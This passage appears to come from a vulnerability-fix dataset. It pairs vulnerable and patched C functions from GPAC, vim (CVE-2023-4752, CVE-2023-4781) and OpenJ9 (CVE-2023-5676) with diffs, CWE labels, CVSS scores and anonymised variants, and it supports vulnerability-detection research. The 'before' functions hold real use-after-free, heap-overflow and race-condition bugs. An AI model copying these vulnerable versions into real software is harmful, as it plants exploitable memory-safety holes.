			VAR_5 = BM_SceneReplace(VAR_0, VAR_1, VAR_2);
			break;
		}
		if (VAR_5) break;
		VAR_3 = gf_bs_read_int(VAR_1, 1);
	}
	while (gf_list_count(VAR_0->QPs)) {
		gf_bifs_dec_qp_remove(VAR_0, VAR_10);
	}

	if (VAR_5) {
		while (gf_list_count(VAR_0->command_buffers) > VAR_9) {
			CommandBufferItem *VAR_11;
			VAR_11 = (CommandBufferItem *)gf_list_pop_back(VAR_0->command_buffers);
			if (VAR_11->node) gf_node_unregister(VAR_11->node, NULL);
			gf_free(VAR_11);
		}
	}

	VAR_0->current_graph = VAR_7;
	VAR_0->pCurrentProto = VAR_8;
	return VAR_5;
}",gpac/0018b5e4e07a1465287e7dff69b387929f5a75fa/memory_decoder.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -6,6 +6,8 @@
 	e = GF_OK;
 	GF_SceneGraph *cur_graph = codec->current_graph;
 	GF_Proto *cur_proto = codec->pCurrentProto;
+
+	u32 nbBufs = gf_list_count(codec->command_buffers);
 
 	codec->LastError = GF_OK;
 	while (go) {
@@ -31,6 +33,15 @@
 		gf_bifs_dec_qp_remove(codec, GF_TRUE);
 	}
 
+	if (e) {
+		while (gf_list_count(codec->command_buffers) > nbBufs) {
+			CommandBufferItem *cbi;
+			cbi = (CommandBufferItem *)gf_list_pop_back(codec->command_buffers);
+			if (cbi->node) gf_node_unregister(cbi->node, NULL);
+			gf_free(cbi);
+		}
+	}
+
 	codec->current_graph = cur_graph;
 	codec->pCurrentProto = cur_proto;
 	return e;","{'deleted_lines': [], 'added_lines': ['', '\tu32 nbBufs = gf_list_count(codec->command_buffers);', '\tif (e) {', '\t\twhile (gf_list_count(codec->command_buffers) > nbBufs) {', '\t\t\tCommandBufferItem *cbi;', '\t\t\tcbi = (CommandBufferItem *)gf_list_pop_back(codec->command_buffers);', '\t\t\tif (cbi->node) gf_node_unregister(cbi->node, NULL);', '\t\t\tgf_free(cbi);', '\t\t}', '\t}', '']}",True,GPAC through 2.2.1 has a use-after-free vulnerability in the function gf_bifs_flush_command_list in bifs/memory_decoder.c.,5.5,MEDIUM,1,valid,2023-08-29T13:32:49Z,4
CVE-2023-4752,['CWE-416'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,vim,"patch 9.0.1858: [security] heap use after free in ins_compl_get_exp()

Problem:  heap use after free in ins_compl_get_exp()
Solution: validate buffer before accessing it

Signed-off-by: Christian Brabandt <cb@256bit.org>",ee9166eb3b41846661a39b662dc7ebe8b5e15139,https://github.com/vim/vim/commit/ee9166eb3b41846661a39b662dc7ebe8b5e15139,src/insexpand.c,ins_compl_get_exp,"static int
ins_compl_get_exp(pos_T *ini)
{
static ins_compl_next_state_T   st;
static int    st_cleared = FALSE;
inti;
intfound_new_match;
inttype = ctrl_x_mode;
if (!compl_started)
{
buf_T *buf;
FOR_ALL_BUFFERS(buf)
buf->b_scanned = 0;
if (!st_cleared)
{
CLEAR_FIELD(st);
st_cleared = TRUE;
}
st.found_all = FALSE;
st.ins_buf = curbuf;
vim_free(st.e_cpt_copy);
st.e_cpt_copy = vim_strsave((compl_cont_status & CONT_LOCAL)
? (char_u *)""."" : curbuf->b_p_cpt);
st.e_cpt = st.e_cpt_copy == NULL ? (char_u *)"""" : st.e_cpt_copy;
st.last_match_pos = st.first_match_pos = *ini;
}
else if (st.ins_buf != curbuf && !buf_valid(st.ins_buf))
st.ins_buf = curbuf;  
compl_old_match = compl_curr_match;    st.cur_match_pos = (compl_dir_forward())
? &st.last_match_pos : &st.first_match_pos;
for (;;)
{
found_new_match = FAIL;
st.set_match_pos = FALSE;
if ((ctrl_x_mode_normal() || ctrl_x_mode_line_or_eval())
&& (!compl_started || st.found_all))
{
int status = process_next_cpt_value(&st, &type, ini);
if (status == INS_COMPL_CPT_END)
break;
if (status == INS_COMPL_CPT_CONT)
continue;
}
if (compl_pattern == NULL)
break;
found_new_match = get_next_completion_match(type, &st, ini);
if ((ctrl_x_mode_not_default() && !ctrl_x_mode_line_or_eval())
|| found_new_match != FAIL)
{
if (got_int)
break;
if (type != -1)
ins_compl_check_keys(0, FALSE);
if ((ctrl_x_mode_not_default()
&& !ctrl_x_mode_line_or_eval()) || compl_interrupted)
break;
compl_started = TRUE;
}
else
{
if (type == 0 || type == CTRL_X_PATH_PATTERNS)
st.ins_buf->b_scanned = TRUE;
compl_started = FALSE;
}
}
compl_started = TRUE;
if ((ctrl_x_mode_normal() || ctrl_x_mode_line_or_eval())
&& *st.e_cpt == NUL)found_new_match = FAIL;
i = -1;    if (found_new_match == FAIL || (ctrl_x_mode_not_default()
&& !ctrl_x_mode_line_or_eval()))
i = ins_compl_make_cyclic();
if (compl_old_match != NULL)
{
compl_curr_match = compl_dir_forward() ? compl_old_match->cp_next
: compl_old_match->cp_prev;
if (compl_curr_match == NULL)
compl_curr_match = compl_old_match;
}
may_trigger_modechanged();
return i;
}","static int
ins_compl_get_exp(pos_T *VAR_0)
{
static ins_compl_next_state_T   VAR_1;
static int    VAR_2 = FALSE;
intVAR_3;
intVAR_4;
intVAR_5 = VAR_6;
if (!VAR_7)
{
buf_T *VAR_8;
VAR_9(buf)
buf->VAR_10 = 0;
if (!VAR_2)
{
CLEAR_FIELD(VAR_1);
VAR_2 = TRUE;
}
VAR_1.found_all = FALSE;
VAR_1.ins_buf = VAR_11;
vim_free(VAR_1.e_cpt_copy);
VAR_1.e_cpt_copy = vim_strsave((VAR_12 & VAR_13)
? (char_u *)""."" : VAR_11->b_p_cpt);
VAR_1.e_cpt = VAR_1.e_cpt_copy == NULL ? (char_u *)"""" : VAR_1.e_cpt_copy;
VAR_1.last_match_pos = VAR_1.first_match_pos = *VAR_0;
}
else if (VAR_1.ins_buf != VAR_11 && !buf_valid(VAR_1.ins_buf))
VAR_1.ins_buf = VAR_11;  
VAR_14 = VAR_15;
VAR_1.cur_match_pos = (compl_dir_forward())
? &VAR_1.last_match_pos : &VAR_1.first_match_pos;
for (;;)
{
VAR_4 = VAR_16;
VAR_1.set_match_pos = FALSE;
if ((ctrl_x_mode_normal() || ctrl_x_mode_line_or_eval())
&& (!VAR_7 || VAR_1.found_all))
{
int VAR_17 = process_next_cpt_value(&VAR_1, &VAR_5, VAR_0);
if (VAR_17 == VAR_18)
break;
if (VAR_17 == VAR_19)
continue;
}
if (VAR_20 == NULL)
break;
VAR_4 = get_next_completion_match(VAR_5, &VAR_1, VAR_0);
if ((ctrl_x_mode_not_default() && !ctrl_x_mode_line_or_eval())
|| VAR_4 != VAR_16)
{
if (VAR_21)
break;
if (VAR_5 != -1)
ins_compl_check_keys(0, FALSE);
if ((ctrl_x_mode_not_default()
&& !ctrl_x_mode_line_or_eval()) || VAR_22)
break;
VAR_7 = TRUE;
}
else
{
if (VAR_5 == 0 || VAR_5 == VAR_23)
VAR_1.ins_buf->b_scanned = TRUE;
VAR_7 = FALSE;
}
}
VAR_7 = TRUE;
if ((ctrl_x_mode_normal() || ctrl_x_mode_line_or_eval())
&& *VAR_1.e_cpt == VAR_24)
VAR_4 = VAR_16;
VAR_3 = -1;
if (VAR_4 == VAR_16 || (ctrl_x_mode_not_default()
&& !ctrl_x_mode_line_or_eval()))
VAR_3 = ins_compl_make_cyclic();
if (VAR_14 != NULL)
{
VAR_15 = compl_dir_forward() ? VAR_14->cp_next
: VAR_14->cp_prev;
if (VAR_15 == NULL)
VAR_15 = VAR_14;
}
may_trigger_modechanged();
return VAR_3;
}",vim/ee9166eb3b41846661a39b662dc7ebe8b5e15139/insexpand.c/vul/before/0.json,"static int
ins_compl_get_exp(pos_T *ini)
{
    static ins_compl_next_state_T   st;
    static int			    st_cleared = FALSE;
    int		i;
    int		found_new_match;
    int		type = ctrl_x_mode;

    if (!compl_started)
    {
	buf_T *buf;

	FOR_ALL_BUFFERS(buf)
	    buf->b_scanned = 0;
	if (!st_cleared)
	{
	    CLEAR_FIELD(st);
	    st_cleared = TRUE;
	}
	st.found_all = FALSE;
	st.ins_buf = curbuf;
	vim_free(st.e_cpt_copy);
	// Make a copy of 'complete', if case the buffer is wiped out.
	st.e_cpt_copy = vim_strsave((compl_cont_status & CONT_LOCAL)
					    ? (char_u *)""."" : curbuf->b_p_cpt);
	st.e_cpt = st.e_cpt_copy == NULL ? (char_u *)"""" : st.e_cpt_copy;
	st.last_match_pos = st.first_match_pos = *ini;
    }
    else if (st.ins_buf != curbuf && !buf_valid(st.ins_buf))
	st.ins_buf = curbuf;  // In case the buffer was wiped out.

    compl_old_match = compl_curr_match;	// remember the last current match
    st.cur_match_pos = (compl_dir_forward())
				? &st.last_match_pos : &st.first_match_pos;

    // For ^N/^P loop over all the flags/windows/buffers in 'complete'.
    for (;;)
    {
	found_new_match = FAIL;
	st.set_match_pos = FALSE;

	// For ^N/^P pick a new entry from e_cpt if compl_started is off,
	// or if found_all says this entry is done.  For ^X^L only use the
	// entries from 'complete' that look in loaded buffers.
	if ((ctrl_x_mode_normal() || ctrl_x_mode_line_or_eval())
					&& (!compl_started || st.found_all))
	{
	    int status = process_next_cpt_value(&st, &type, ini);

	    if (status == INS_COMPL_CPT_END)
		break;
	    if (status == INS_COMPL_CPT_CONT)
		continue;
	}

	// If complete() was called then compl_pattern has been reset.  The
	// following won't work then, bail out.
	if (compl_pattern == NULL)
	    break;

	// get the next set of completion matches
	found_new_match = get_next_completion_match(type, &st, ini);

	// break the loop for specialized modes (use 'complete' just for the
	// generic ctrl_x_mode == CTRL_X_NORMAL) or when we've found a new
	// match
	if ((ctrl_x_mode_not_default() && !ctrl_x_mode_line_or_eval())
						|| found_new_match != FAIL)
	{
	    if (got_int)
		break;
	    // Fill the popup menu as soon as possible.
	    if (type != -1)
		ins_compl_check_keys(0, FALSE);

	    if ((ctrl_x_mode_not_default()
			&& !ctrl_x_mode_line_or_eval()) || compl_interrupted)
		break;
	    compl_started = TRUE;
	}
	else
	{
	    // Mark a buffer scanned when it has been scanned completely
	    if (buf_valid(st.ins_buf) && (type == 0 || type == CTRL_X_PATH_PATTERNS))
		st.ins_buf->b_scanned = TRUE;

	    compl_started = FALSE;
	}
    }
    compl_started = TRUE;

    if ((ctrl_x_mode_normal() || ctrl_x_mode_line_or_eval())
	    && *st.e_cpt == NUL)		// Got to end of 'complete'
	found_new_match = FAIL;

    i = -1;		// total of matches, unknown
    if (found_new_match == FAIL || (ctrl_x_mode_not_default()
					       && !ctrl_x_mode_line_or_eval()))
	i = ins_compl_make_cyclic();

    if (compl_old_match != NULL)
    {
	// If several matches were added (FORWARD) or the search failed and has
	// just been made cyclic then we have to move compl_curr_match to the
	// next or previous entry (if any) -- Acevedo
	compl_curr_match = compl_dir_forward() ? compl_old_match->cp_next
						    : compl_old_match->cp_prev;
	if (compl_curr_match == NULL)
	    compl_curr_match = compl_old_match;
    }
    may_trigger_modechanged();

    return i;
}","static int
ins_compl_get_exp(pos_T *VAR_0)
{
    static ins_compl_next_state_T   VAR_1;
    static int			    VAR_2 = FALSE;
    int		VAR_3;
    int		VAR_4;
    int		VAR_5 = VAR_6;

    if (!VAR_7)
    {
	buf_T *VAR_8;

	VAR_9(buf)
	    buf->VAR_10 = 0;
	if (!VAR_2)
	{
	    CLEAR_FIELD(VAR_1);
	    VAR_2 = TRUE;
	}
	VAR_1.found_all = FALSE;
	VAR_1.ins_buf = VAR_11;
	vim_free(VAR_1.e_cpt_copy);
	/* COMMENT_0 */
	VAR_1.e_cpt_copy = vim_strsave((VAR_12 & VAR_13)
					    ? (char_u *)""."" : VAR_11->b_p_cpt);
	VAR_1.e_cpt = VAR_1.e_cpt_copy == NULL ? (char_u *)"""" : VAR_1.e_cpt_copy;
	VAR_1.last_match_pos = VAR_1.first_match_pos = *VAR_0;
    }
    else if (VAR_1.ins_buf != VAR_11 && !buf_valid(VAR_1.ins_buf))
	VAR_1.ins_buf = VAR_11;  /* COMMENT_1 */

    VAR_14 = VAR_15;	/* COMMENT_2 */
    VAR_1.cur_match_pos = (compl_dir_forward())
				? &VAR_1.last_match_pos : &VAR_1.first_match_pos;

    /* COMMENT_3 */
    for (;;)
    {
	VAR_4 = VAR_16;
	VAR_1.set_match_pos = FALSE;

	/* COMMENT_4 */
	/* COMMENT_5 */
	/* COMMENT_6 */
	if ((ctrl_x_mode_normal() || ctrl_x_mode_line_or_eval())
					&& (!VAR_7 || VAR_1.found_all))
	{
	    int VAR_17 = process_next_cpt_value(&VAR_1, &VAR_5, VAR_0);

	    if (VAR_17 == VAR_18)
		break;
	    if (VAR_17 == VAR_19)
		continue;
	}

	/* COMMENT_7 */
	/* COMMENT_8 */
	if (VAR_20 == NULL)
	    break;

	/* COMMENT_9 */
	VAR_4 = get_next_completion_match(VAR_5, &VAR_1, VAR_0);

	/* COMMENT_10 */
	/* COMMENT_11 */
	/* COMMENT_12 */
	if ((ctrl_x_mode_not_default() && !ctrl_x_mode_line_or_eval())
						|| VAR_4 != VAR_16)
	{
	    if (VAR_21)
		break;
	    /* COMMENT_13 */
	    if (VAR_5 != -1)
		ins_compl_check_keys(0, FALSE);

	    if ((ctrl_x_mode_not_default()
			&& !ctrl_x_mode_line_or_eval()) || VAR_22)
		break;
	    VAR_7 = TRUE;
	}
	else
	{
	    /* COMMENT_14 */
	    if (buf_valid(VAR_1.ins_buf) && (VAR_5 == 0 || VAR_5 == VAR_23))
		VAR_1.ins_buf->b_scanned = TRUE;

	    VAR_7 = FALSE;
	}
    }
    VAR_7 = TRUE;

    if ((ctrl_x_mode_normal() || ctrl_x_mode_line_or_eval())
	    && *VAR_1.e_cpt == VAR_24)		/* COMMENT_15 */
	VAR_4 = VAR_16;

    VAR_3 = -1;		/* COMMENT_16 */
    if (VAR_4 == VAR_16 || (ctrl_x_mode_not_default()
					       && !ctrl_x_mode_line_or_eval()))
	VAR_3 = ins_compl_make_cyclic();

    if (VAR_14 != NULL)
    {
	/* COMMENT_17 */
	/* COMMENT_18 */
	/* COMMENT_19 */
	VAR_15 = compl_dir_forward() ? VAR_14->cp_next
						    : VAR_14->cp_prev;
	if (VAR_15 == NULL)
	    VAR_15 = VAR_14;
    }
    may_trigger_modechanged();

    return VAR_3;
}",vim/ee9166eb3b41846661a39b662dc7ebe8b5e15139/insexpand.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -82,7 +82,7 @@
 	else
 	{
 	    // Mark a buffer scanned when it has been scanned completely
-	    if (type == 0 || type == CTRL_X_PATH_PATTERNS)
+	    if (buf_valid(st.ins_buf) && (type == 0 || type == CTRL_X_PATH_PATTERNS))
 		st.ins_buf->b_scanned = TRUE;
 
 	    compl_started = FALSE;","{'deleted_lines': ['\t    if (type == 0 || type == CTRL_X_PATH_PATTERNS)'], 'added_lines': ['\t    if (buf_valid(st.ins_buf) && (type == 0 || type == CTRL_X_PATH_PATTERNS))']}",True,Use After Free in GitHub repository vim/vim prior to 9.0.1858.,7.8,HIGH,2,valid,2023-09-03T19:24:33Z,4
CVE-2023-4781,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,vim,"patch 9.0.1873: [security] heap-buffer-overflow in vim_regsub_both

Problem:  heap-buffer-overflow in vim_regsub_both
Solution: Disallow exchanging windows when textlock is active

Signed-off-by: Christian Brabandt <cb@256bit.org>",f6d28fe2c95c678cc3202cc5dc825a3fcc709e93,https://github.com/vim/vim/commit/f6d28fe2c95c678cc3202cc5dc825a3fcc709e93,src/window.c,win_exchange,"static void
win_exchange(long Prenum)
{
frame_T*frp;
frame_T*frp2;
win_T*wp;
win_T*wp2;
inttemp;
if (ERROR_IF_ANY_POPUP_WINDOW)
return;
if (ONE_WINDOW)        {
beep_flush();
return;
}
#ifdef FEAT_GUI
need_mouse_correct = TRUE;
#endif
if (Prenum)
{
frp = curwin->w_frame->fr_parent->fr_child;
while (frp != NULL && --Prenum > 0)
frp = frp->fr_next;
}
else if (curwin->w_frame->fr_next != NULL)frp = curwin->w_frame->fr_next;
else    frp = curwin->w_frame->fr_prev;
if (frp == NULL || frp->fr_win == NULL || frp->fr_win == curwin)
return;
wp = frp->fr_win;
wp2 = curwin->w_prev;
frp2 = curwin->w_frame->fr_prev;
if (wp->w_prev != curwin)
{
win_remove(curwin, NULL);
frame_remove(curwin->w_frame);
win_append(wp->w_prev, curwin);
frame_insert(frp, curwin->w_frame);
}
if (wp != wp2)
{
win_remove(wp, NULL);
frame_remove(wp->w_frame);
win_append(wp2, wp);
if (frp2 == NULL)
frame_insert(wp->w_frame->fr_parent->fr_child, wp->w_frame);
else
frame_append(frp2, wp->w_frame);
}
temp = curwin->w_status_height;
curwin->w_status_height = wp->w_status_height;
wp->w_status_height = temp;
temp = curwin->w_vsep_width;
curwin->w_vsep_width = wp->w_vsep_width;
wp->w_vsep_width = temp;
frame_fix_height(curwin);
frame_fix_height(wp);
frame_fix_width(curwin);
frame_fix_width(wp);
(void)win_comp_pos();
if (wp->w_buffer != curbuf)
reset_VIsual_and_resel();
else if (VIsual_active)
wp->w_cursor = curwin->w_cursor;
win_enter(wp, TRUE);
redraw_all_later(UPD_NOT_VALID);
}","static void
win_exchange(long VAR_0)
{
frame_T*VAR_1;
frame_T*VAR_2;
win_T*VAR_3;
win_T*VAR_4;
intVAR_5;
if (VAR_6)
return;
if (VAR_7)    
{
beep_flush();
return;
}
#ifdef VAR_8
VAR_9 = TRUE;
#endif
if (VAR_0)
{
VAR_1 = VAR_10->w_frame->fr_parent->fr_child;
while (VAR_1 != NULL && --VAR_0 > 0)
VAR_1 = VAR_1->fr_next;
}
else if (VAR_10->w_frame->fr_next != NULL)
VAR_1 = VAR_10->w_frame->fr_next;
else    
VAR_1 = VAR_10->w_frame->fr_prev;
if (VAR_1 == NULL || VAR_1->fr_win == NULL || VAR_1->fr_win == VAR_10)
return;
VAR_3 = VAR_1->fr_win;
VAR_4 = VAR_10->w_prev;
VAR_2 = VAR_10->w_frame->fr_prev;
if (VAR_3->w_prev != VAR_10)
{
win_remove(VAR_10, NULL);
frame_remove(VAR_10->w_frame);
win_append(VAR_3->w_prev, VAR_10);
frame_insert(VAR_1, VAR_10->w_frame);
}
if (VAR_3 != VAR_4)
{
win_remove(VAR_3, NULL);
frame_remove(VAR_3->w_frame);
win_append(VAR_4, VAR_3);
if (VAR_2 == NULL)
frame_insert(VAR_3->w_frame->fr_parent->fr_child, VAR_3->w_frame);
else
frame_append(VAR_2, VAR_3->w_frame);
}
VAR_5 = VAR_10->w_status_height;
VAR_10->w_status_height = VAR_3->w_status_height;
VAR_3->w_status_height = VAR_5;
VAR_5 = VAR_10->w_vsep_width;
VAR_10->w_vsep_width = VAR_3->w_vsep_width;
VAR_3->w_vsep_width = VAR_5;
frame_fix_height(VAR_10);
frame_fix_height(VAR_3);
frame_fix_width(VAR_10);
frame_fix_width(VAR_3);
(void)win_comp_pos();
if (VAR_3->w_buffer != VAR_11)
reset_VIsual_and_resel();
else if (VAR_12)
VAR_3->w_cursor = VAR_10->w_cursor;
win_enter(VAR_3, TRUE);
redraw_all_later(VAR_13);
}",vim/f6d28fe2c95c678cc3202cc5dc825a3fcc709e93/window.c/vul/before/0.json,"static void
win_exchange(long Prenum)
{
    frame_T	*frp;
    frame_T	*frp2;
    win_T	*wp;
    win_T	*wp2;
    int		temp;

    if (ERROR_IF_ANY_POPUP_WINDOW)
	return;
    if (ONE_WINDOW)	    // just one window
    {
	beep_flush();
	return;
    }
    if (text_or_buf_locked())
    {
	beep_flush();
	return;
    }

#ifdef FEAT_GUI
    need_mouse_correct = TRUE;
#endif

    /*
     * find window to exchange with
     */
    if (Prenum)
    {
	frp = curwin->w_frame->fr_parent->fr_child;
	while (frp != NULL && --Prenum > 0)
	    frp = frp->fr_next;
    }
    else if (curwin->w_frame->fr_next != NULL)	// Swap with next
	frp = curwin->w_frame->fr_next;
    else    // Swap last window in row/col with previous
	frp = curwin->w_frame->fr_prev;

    // We can only exchange a window with another window, not with a frame
    // containing windows.
    if (frp == NULL || frp->fr_win == NULL || frp->fr_win == curwin)
	return;
    wp = frp->fr_win;

/*
 * 1. remove curwin from the list. Remember after which window it was in wp2
 * 2. insert curwin before wp in the list
 * if wp != wp2
 *    3. remove wp from the list
 *    4. insert wp after wp2
 * 5. exchange the status line height and vsep width.
 */
    wp2 = curwin->w_prev;
    frp2 = curwin->w_frame->fr_prev;
    if (wp->w_prev != curwin)
    {
	win_remove(curwin, NULL);
	frame_remove(curwin->w_frame);
	win_append(wp->w_prev, curwin);
	frame_insert(frp, curwin->w_frame);
    }
    if (wp != wp2)
    {
	win_remove(wp, NULL);
	frame_remove(wp->w_frame);
	win_append(wp2, wp);
	if (frp2 == NULL)
	    frame_insert(wp->w_frame->fr_parent->fr_child, wp->w_frame);
	else
	    frame_append(frp2, wp->w_frame);
    }
    temp = curwin->w_status_height;
    curwin->w_status_height = wp->w_status_height;
    wp->w_status_height = temp;
    temp = curwin->w_vsep_width;
    curwin->w_vsep_width = wp->w_vsep_width;
    wp->w_vsep_width = temp;

    frame_fix_height(curwin);
    frame_fix_height(wp);
    frame_fix_width(curwin);
    frame_fix_width(wp);

    (void)win_comp_pos();		// recompute window positions

    if (wp->w_buffer != curbuf)
	reset_VIsual_and_resel();
    else if (VIsual_active)
	wp->w_cursor = curwin->w_cursor;

    win_enter(wp, TRUE);
    redraw_all_later(UPD_NOT_VALID);
}","static void
win_exchange(long VAR_0)
{
    frame_T	*VAR_1;
    frame_T	*VAR_2;
    win_T	*VAR_3;
    win_T	*VAR_4;
    int		VAR_5;

    if (VAR_6)
	return;
    if (VAR_7)	    /* COMMENT_0 */
    {
	beep_flush();
	return;
    }
    if (text_or_buf_locked())
    {
	beep_flush();
	return;
    }

#ifdef VAR_8
    VAR_9 = TRUE;
#endif

    /* COMMENT_1 */
                                   
       
    if (VAR_0)
    {
	VAR_1 = VAR_10->w_frame->fr_parent->fr_child;
	while (VAR_1 != NULL && --VAR_0 > 0)
	    VAR_1 = VAR_1->fr_next;
    }
    else if (VAR_10->w_frame->fr_next != NULL)	/* COMMENT_4 */
	VAR_1 = VAR_10->w_frame->fr_next;
    else    /* COMMENT_5 */
	VAR_1 = VAR_10->w_frame->fr_prev;

    /* COMMENT_6 */
    /* COMMENT_7 */
    if (VAR_1 == NULL || VAR_1->fr_win == NULL || VAR_1->fr_win == VAR_10)
	return;
    VAR_3 = VAR_1->fr_win;

/* COMMENT_8 */
                                                                            
                                         
               
                                
                            
                                                     
   
    VAR_4 = VAR_10->w_prev;
    VAR_2 = VAR_10->w_frame->fr_prev;
    if (VAR_3->w_prev != VAR_10)
    {
	win_remove(VAR_10, NULL);
	frame_remove(VAR_10->w_frame);
	win_append(VAR_3->w_prev, VAR_10);
	frame_insert(VAR_1, VAR_10->w_frame);
    }
    if (VAR_3 != VAR_4)
    {
	win_remove(VAR_3, NULL);
	frame_remove(VAR_3->w_frame);
	win_append(VAR_4, VAR_3);
	if (VAR_2 == NULL)
	    frame_insert(VAR_3->w_frame->fr_parent->fr_child, VAR_3->w_frame);
	else
	    frame_append(VAR_2, VAR_3->w_frame);
    }
    VAR_5 = VAR_10->w_status_height;
    VAR_10->w_status_height = VAR_3->w_status_height;
    VAR_3->w_status_height = VAR_5;
    VAR_5 = VAR_10->w_vsep_width;
    VAR_10->w_vsep_width = VAR_3->w_vsep_width;
    VAR_3->w_vsep_width = VAR_5;

    frame_fix_height(VAR_10);
    frame_fix_height(VAR_3);
    frame_fix_width(VAR_10);
    frame_fix_width(VAR_3);

    (void)win_comp_pos();		/* COMMENT_16 */

    if (VAR_3->w_buffer != VAR_11)
	reset_VIsual_and_resel();
    else if (VAR_12)
	VAR_3->w_cursor = VAR_10->w_cursor;

    win_enter(VAR_3, TRUE);
    redraw_all_later(VAR_13);
}",vim/f6d28fe2c95c678cc3202cc5dc825a3fcc709e93/window.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -10,6 +10,11 @@
     if (ERROR_IF_ANY_POPUP_WINDOW)
 	return;
     if (ONE_WINDOW)	    // just one window
+    {
+	beep_flush();
+	return;
+    }
+    if (text_or_buf_locked())
     {
 	beep_flush();
 	return;","{'deleted_lines': [], 'added_lines': ['    {', '\tbeep_flush();', '\treturn;', '    }', '    if (text_or_buf_locked())']}",True,Heap-based Buffer Overflow in GitHub repository vim/vim prior to 9.0.1873.,7.8,HIGH,2,valid,2023-09-05T18:18:06Z,4
CVE-2023-5676,['CWE-362'],CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H,1,eclipse-openj9/openj9,"Don't invoke shutdown signal handler until JVM init completes

JVM init path: J9_CreateJavaVM.
JVM exit paths: protectedDestroyJavaVM and exitJavaVM.

A segfault or other side-effects can happen if the JVM init and
exit paths execute concurrently.

The exit path can be taken if a shutdown signal is raised and the
shutdown handler is invoked. JVM shutdown signals are SIGINT, SIGTERM
and SIGHUP.

Preventing invocation of the exit path from the shutdown signal handler
until the JVM initialization completes resolves the above side-effects.

Related:
- #17101
- #17438

Signed-off-by: Babneet Singh <sbabneet@ca.ibm.com>",d4dfa6c62270ea34fcc859355a66bc25b8175237,https://github.com/eclipse-openj9/openj9/commit/d4dfa6c62270ea34fcc859355a66bc25b8175237,runtime/vm/jvminit.c,predefinedHandlerWrapper,"static UDATA
predefinedHandlerWrapper(struct J9PortLibrary *portLibrary, U_32 gpType, void *gpInfo, void *userData)
{
J9JavaVM *vm = (J9JavaVM *)userData;
J9JavaVMAttachArgs attachArgs = {0};
J9VMThread *vmThread = NULL;
IDATA result = JNI_ERR;
BOOLEAN shutdownStarted = FALSE;
I_32 signal = 0;
PORT_ACCESS_FROM_JAVAVM(vm);
signal = j9sig_map_portlib_signal_to_os_signal(gpType);
if ((signal <= 0) || J9_ARE_ANY_BITS_SET(vm->sigFlags, J9_SIG_XRS_ASYNC)) {
return 1;
}
omrthread_monitor_enter(vm->runtimeFlagsMutex);
if (J9_ARE_ANY_BITS_SET(vm->runtimeFlags, J9_RUNTIME_EXIT_STARTED)) {
shutdownStarted = TRUE;
}
omrthread_monitor_exit(vm->runtimeFlagsMutex);
if (shutdownStarted) {
return 1;
}
attachArgs.version = JNI_VERSION_1_8;
attachArgs.name = ""JVM Signal Thread"";
attachArgs.group = vm->systemThreadGroupRef;
result = internalAttachCurrentThread(vm, &vmThread, &attachArgs,
J9_PRIVATE_FLAGS_DAEMON_THREAD | J9_PRIVATE_FLAGS_SYSTEM_THREAD | J9_PRIVATE_FLAGS_ATTACHED_THREAD,
omrthread_self());
if (JNI_OK != result) {
return 1;
}
signalDispatch(vmThread, signal);
DetachCurrentThread((JavaVM *)vm);
return 0;
}","static UDATA
predefinedHandlerWrapper(struct J9PortLibrary *VAR_0, U_32 VAR_1, void *VAR_2, void *VAR_3)
{
J9JavaVM *VAR_4 = (J9JavaVM *)VAR_3;
J9JavaVMAttachArgs VAR_5 = {0};
J9VMThread *VAR_6 = NULL;
IDATA VAR_7 = VAR_8;
BOOLEAN VAR_9 = FALSE;
I_32 VAR_10 = 0;
PORT_ACCESS_FROM_JAVAVM(VAR_4);
VAR_10 = j9sig_map_portlib_signal_to_os_signal(VAR_1);
if ((VAR_10 <= 0) || J9_ARE_ANY_BITS_SET(VAR_4->sigFlags, VAR_11)) {
return 1;
}
omrthread_monitor_enter(VAR_4->runtimeFlagsMutex);
if (J9_ARE_ANY_BITS_SET(VAR_4->runtimeFlags, VAR_12)) {
VAR_9 = TRUE;
}
omrthread_monitor_exit(VAR_4->runtimeFlagsMutex);
if (VAR_9) {
return 1;
}
VAR_5.version = VAR_13;
VAR_5.name = ""JVM Signal Thread"";
VAR_5.group = VAR_4->systemThreadGroupRef;
VAR_7 = internalAttachCurrentThread(VAR_4, &VAR_6, &VAR_5,
VAR_14 | VAR_15 | VAR_16,
omrthread_self());
if (VAR_17 != VAR_7) {
return 1;
}
signalDispatch(VAR_6, VAR_10);
DetachCurrentThread((JavaVM *)VAR_4);
return 0;
}",eclipse-openj9/openj9/d4dfa6c62270ea34fcc859355a66bc25b8175237/jvminit.c/vul/before/0.json,"static UDATA
predefinedHandlerWrapper(struct J9PortLibrary *portLibrary, U_32 gpType, void *gpInfo, void *userData)
{
	J9JavaVM *vm = (J9JavaVM *)userData;
	J9JavaVMAttachArgs attachArgs = {0};
	J9VMThread *vmThread = NULL;
	IDATA result = JNI_ERR;
	BOOLEAN invokeHandler = TRUE;
	I_32 signal = 0;
	U_32 runtimeFlags = 0;
	PORT_ACCESS_FROM_JAVAVM(vm);

	signal = j9sig_map_portlib_signal_to_os_signal(gpType);
	/* Don't invoke handler if signal is 0 or negative, or if -Xrs or -Xrs:async is specified */
	if ((signal <= 0) || J9_ARE_ANY_BITS_SET(vm->sigFlags, J9_SIG_XRS_ASYNC)) {
		return 1;
	}

	/* Don't invoke handler if JVM hasn't initialized or JVM exit has started. */
	issueReadBarrier();
	runtimeFlags = vm->runtimeFlags;
	if (J9_ARE_NO_BITS_SET(runtimeFlags, J9_RUNTIME_INITIALIZED)
	|| J9_ARE_ANY_BITS_SET(runtimeFlags, J9_RUNTIME_EXIT_STARTED)
	) {
		invokeHandler = FALSE;
	}

	if (!invokeHandler) {
		return 1;
	}

	attachArgs.version = JNI_VERSION_1_8;
	attachArgs.name = ""JVM Signal Thread"";
	attachArgs.group = vm->systemThreadGroupRef;

	/* Attach current thread as a daemon thread */
	result = internalAttachCurrentThread(vm, &vmThread, &attachArgs,
				J9_PRIVATE_FLAGS_DAEMON_THREAD | J9_PRIVATE_FLAGS_SYSTEM_THREAD | J9_PRIVATE_FLAGS_ATTACHED_THREAD,
				omrthread_self());

	if (JNI_OK != result) {
		/* Thread couldn't be attached. So, we can't run Java code. */
		return 1;
	}

	/* Run handler (Java code). */
	signalDispatch(vmThread, signal);

